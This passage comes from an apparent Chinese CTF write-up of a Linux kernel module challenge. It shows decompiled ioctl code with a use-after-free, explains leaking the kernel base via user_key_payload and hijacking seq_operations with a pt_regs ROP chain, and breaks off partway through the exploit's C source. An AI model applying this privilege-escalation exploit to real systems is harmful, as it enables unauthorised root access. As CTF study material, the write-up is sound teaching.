class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">rwmod_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  __int64 index; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdi</span></span><br><span class="line">  Input input; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !a3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xC0DECAFE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(&amp;input, a3, <span class="number">16LL</span>) &amp;&amp; input.index &lt;= <span class="number">1u</span> )</span><br><span class="line">      kfree(buf[input.index]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;input, a3, <span class="number">16LL</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    index = (<span class="type">unsigned</span> <span class="type">int</span>)input.index;</span><br><span class="line">    <span class="keyword">if</span> ( input.index &gt; <span class="number">1u</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    buf[index] = _kmalloc((<span class="type">unsigned</span> <span class="type">int</span>)input.size, <span class="number">0xDC0</span>LL);</span><br><span class="line">    v6 = buf[input.index];</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)input.size &gt; <span class="number">0x7FFFFFFF</span>uLL )</span><br><span class="line">      BUG();</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v6, input.buf, (<span class="type">unsigned</span> <span class="type">int</span>)input.size) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们在内核中最多可以同时拥有2个堆块。可以看见当选项为<code>0xC0DECAFE</code>时，将堆块<code>kfree</code>后并没有将指针置空，存在<code>UAF</code>漏洞。通过程序分析，我们需要传入的是下面这个结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">char</span>* ptr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>该思路主要用到的结构体有<code>seq_file</code>、<code>pt_regs</code>、内核密钥管理。<br>我们首先看看内核密钥管理<br>该管理的详细信息可以看：<a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/">https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/</a><br>其类似内核中的菜单堆，我们可以通过下面这些函数来对其进行操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_alloc</span><span class="params">(<span class="type">char</span> *description, <span class="type">char</span> *payload, <span class="type">size_t</span> plen)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_add_key, <span class="string">&quot;user&quot;</span>, description, payload, plen, </span><br><span class="line">                   KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_update</span><span class="params">(<span class="type">int</span> keyid, <span class="type">char</span> *payload, <span class="type">size_t</span> plen)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_read</span><span class="params">(<span class="type">int</span> keyid, <span class="type">char</span> *buffer, <span class="type">size_t</span> buflen)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_revoke</span><span class="params">(<span class="type">int</span> keyid)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_unlink</span><span class="params">(<span class="type">int</span> keyid)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面重点看看user_key_payload结构体</p><h4 id="user-key-payload"><a href="#user-key-payload" class="headerlink" title="user_key_payload"></a>user_key_payload</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU destructor */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>datalen;<span class="comment">/* length of this data */</span></span><br><span class="line"><span class="type">char</span>data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure><p>该结构是用于存储密钥的<code>payload</code>，当我们调用<code>key_read</code>函数来获取<code>payload</code>的数据时，读取的长度由<code>datalen</code>这个变量来决定。所以我们可以想到利用<code>UAF</code>漏洞来将<code>datalen</code>的数值改大，导致在获取<code>payload</code>的数据时越界读，泄露出内核的地址<br>那我们要读取哪里才可以获得内核地址呢，我们可以看到上面的<code>callback_head</code>结构体里面存在一个函数指针，当密钥的<code>type</code>为<code>user</code>时，在<code>payload</code>被释放时该指针会被赋值为<code>user_free_payload_rcu()</code>，因此我们可以先释放掉一段<code>payload</code>，然后通过越界读来获取改指针的值，计算出内核的基址<br>需要注意的是，<code>add_key()</code> 会先分配一个临时的 <code>obj1</code> 拷贝 <code>payload</code> 后再分配一个 <code>obj2</code> 作为 <code>user_key_payload</code>，若我们先分配一个 <code>obj</code> 并释放后再调用 <code>add_key()</code> 则该 <code>obj</code> 不会直接成为 <code>user_key_payload</code> ，而是会在后续的数次分配中都作为拷贝 <code>payload</code> 的临时 <code>obj</code> 存在<br>在泄露出内核地址后，我们的要考虑的是如果劫持程序流，这里我们可以将<code>seq_file</code>和<code>pt_regs</code>结合起来利用。我们首先来看看<code>pt_regs</code>结构体</p><h4 id="pt-regs-1"><a href="#pt-regs-1" class="headerlink" title="pt_regs"></a>pt_regs</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在我们执行系统调用时，内核会将所有寄存器压入内核栈上，形成该<code>pt_regs</code>结构体，该结构体位于内核的栈底。当我们劫持内核结构体中的某个函数指针时，在我们通过该函数指针劫持内核执行流时<code>rsp</code>与栈底的相对偏移通常是不变的，所以这些寄存器为我们布置<code>ROP</code>链条提供了可能，只要找到一条类似于<code>add rsp, xxx; ret</code>的<code>gadget</code>就能够完成<code>ROP</code></p><h4 id="方便调试模板"><a href="#方便调试模板" class="headerlink" title="方便调试模板"></a>方便调试模板</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">       <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r9,    0x88888888;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov r8,    0x99999999;&quot;</span></span><br><span class="line">       <span class="string">&quot;xor rax,   rax;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rdx,   8;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rsi,   rsp;&quot;</span></span><br><span class="line">       <span class="string">&quot;mov rdi,   seq_fd;&quot;</span>        <span class="comment">// 这里假定通过 seq_operations-&gt;stat 来触发</span></span><br><span class="line">       <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>但是在高版本的内核中会默认开启<code>CONFIG_RANDOMIZE_KSTACK_OFFSET=y</code>保护，该保护为系统调用添加了一个偏移，即<code>pt_regs</code>与我们触发劫持内核执行流的栈偏移值不再是固定值，导致我们难以再使用改方法<br>接下来简单看<code>seq_file</code>相关结构体，详细内容可以查看：<a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/">https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/</a><br>当我们打开<code>proc/self/stat</code>文件即可分配到一个<code>seq_operations</code>结构体</p><h4 id="seq-operations"><a href="#seq-operations" class="headerlink" title="seq_operations"></a>seq_operations</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">    <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们<code>read</code>一个<code>stat</code>文件时，内核会调用<code>proc_ops</code>的<code>proc_read_iter</code>指针，其默认值为 <code>seq_read_iter()</code> 函数，定义于 <code>fs/seq_file.c</code> 中，注意到有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read_iter</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *iter)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>即会调用<code>seq_operations</code>的<code>start</code>函数。在这一道题目中我们不难想到，可以利用<code>UAF</code>漏洞将<code>seq_operations</code>中的<code>start</code>函数的函数指针改为类似于<code>add rsp, xxx</code>这样的<code>gadget</code>，然后布置好我们的<code>pt_regs</code>结构体，最后通过<code>read</code>一个<code>stat</code>文件来劫持内核程序流来实现提权</p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -static -masm=intel -pthread exp.c -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_FREE_PAYLOAD_RCU 0xFFFFFFFF813D8210</span></span><br><span class="line"><span class="type">size_t</span> pop_rdi = <span class="number">0xffffffff8106ab4d</span>; </span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff82850580</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff81095c30</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_xx = <span class="number">0xFFFFFFFF812A9811</span>;<span class="comment">// FFFFFFFF813A193A;</span></span><br><span class="line"><span class="type">size_t</span> swapgs_kpti = <span class="number">0xFFFFFFFF81E00EF3</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">char</span>* ptr;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    